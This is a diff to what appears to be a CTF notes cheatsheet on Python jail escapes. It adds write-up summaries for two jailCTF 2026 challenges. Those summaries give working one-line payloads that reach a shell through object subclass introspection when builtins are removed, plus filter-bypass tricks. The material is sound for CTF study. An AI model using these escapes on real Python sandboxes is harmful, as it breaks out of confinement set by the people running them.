@@ -7,6 +7,7 @@ This document provides a comprehensive collection of Python jail escape techniqu
 - [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/)
 - [Pyjail collection](https://github.com/jailctf/pyjail-collection)
 - [A collection of pyjails](https://github.com/salvatore-abello/pyjail/tree/main)
+- [Pyjail cheatsheet](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md)
 
 ## Quick Reference Cheatsheet
 
@@ -75,6 +76,22 @@ except Exception as e:
 - `pydoc.pipe_pager(text, cmd)`
 - `pydoc.tempfile_pager(text, cmd)`
 - `object.__subclasses__()[popen_index](['sh'])` (via `<class 'subprocess.Popen'>`)
+
+## jailCTF 2026 the quasar files
+
+Requirements:
+
+1. No builtins: use `().__class__.__base__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")` to get shell
+2. No `[]"'`: use `__getitem__` and `().__doc__.__getitem__`
+
+Details [here](../2026-07-25-jailctf-2026/the-quasar-files.md).
+
+## jailCTF 2026 collatz
+
+1. No builtins: use `().__class__.__subclasses__()[codecs_codecinfo_index].__new__.__globals__["__builtins__"]["__import__"]("subprocess").check_call("rbash")`
+2. Length of words (`\w+`) conforming to collatz sequence: 9 (`__class__`) -> 28 -> 14 (`__subclasses__`) -> 7 (`__new__`) -> 22 -> 11 (`__globals__`) -> 34 (`__builtins__` with padding) -> 17 (array subscript) -> 52 (`__import__` with padding) -> 26 (array subscript) -> 13 (`subprocess` with padding) -> 40 (array subscript) -> 20 -> 10 (`check_call`) -> 5 (`rbash`), use `[value][0000000]` to handle the rest widths
+
+Details [here](../2026-07-25-jailctf-2026/collatz.md).
 
 ## SECCON CTF 14 2026 Final increasing
 
